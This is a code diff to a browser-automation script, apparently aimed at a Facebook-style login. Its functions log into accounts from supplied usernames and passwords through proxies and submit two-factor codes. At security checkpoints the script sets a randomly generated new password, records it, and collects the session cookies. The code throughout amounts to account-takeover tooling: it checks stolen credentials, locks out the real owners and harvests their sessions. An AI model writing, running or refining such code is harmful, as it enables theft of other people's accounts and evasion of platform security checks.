@@ -14,7 +14,7 @@ async function check(username, password, proxyInfo) {
     let status;
     let cookies;
     const launchOptions = {
-        headless: "new"
+        headless: false
     };
 
     if (proxyInfo.host && proxyInfo.port && proxyInfo.username && proxyInfo.password) {
@@ -128,7 +128,7 @@ async function enterCode(username, password, code, proxyInfo) {
     let cookies;
     let newpass;
     const launchOptions = {
-        headless: "new"
+        headless: false
     };
 
     if (proxyInfo.host && proxyInfo.port && proxyInfo.username && proxyInfo.password) {
@@ -177,24 +177,30 @@ async function enterCode(username, password, code, proxyInfo) {
                     await page.click('input[type="submit"]');
                     const wrongCode = await page.$('#approvals_code');
                     if (wrongCode) {
-                        status = 'WRONGCODE';
                         await browser.close();
-                        return status;
+                        return {
+                            status: 'WRONG CODE'
+                        };
                     }
                     else {
                         let currentUrl = page.url();
                         let i = 0;
                         while (i < 8) {
                             if (currentUrl.includes('checkpoint')) {
-                                await page.click('input[type="submit"]');
+                                const submitButton = await page.$('input[type="submit"]');
+                                if (submitButton) {
+                                    await page.click('input[type="submit"]');
+                                }
                                 const newPassword = await page.$('input[name="password_new"]');
                                 if (newPassword) {
                                     const randomPassword = generateRandomPassword(8);
                                     await page.type('input[name="password_new"]', randomPassword);
                                     await page.click('input[type="submit"]');
                                     newpass = randomPassword;
+                                    status = "2FA NEW PASS";
                                 }
-                                currentUrl = await page.url();
+                                // sleep 2s
+                                currentUrl = page.url();
                             }
                             else {
                                 cookies = (await page.cookies()).map(cookie => {
